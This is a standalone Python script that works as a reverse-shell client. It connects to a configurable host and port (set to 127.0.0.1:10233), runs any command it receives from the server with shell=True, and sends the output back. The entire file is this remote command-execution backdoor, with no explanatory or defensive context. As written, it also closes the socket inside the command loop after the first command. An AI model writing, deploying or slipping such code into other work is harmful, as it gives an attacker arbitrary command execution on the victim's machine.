import socket
import subprocess

class Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


    def connect(self):
        while True:
            try:
                self.socket.connect((self.host, self.port))
                print ('Connected to Server')
                break
            except:
                pass
            

        while True:
            try:
                command = self.socket.recv(1024).decode()
                if not command:
                    break
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
                self.socket.send(output)
            except:
                break

            self.socket.close()


if __name__ == '__main__':
    host = "127.0.0.1"
    port = 10233

    client = Client(host, port)
    client.connect()


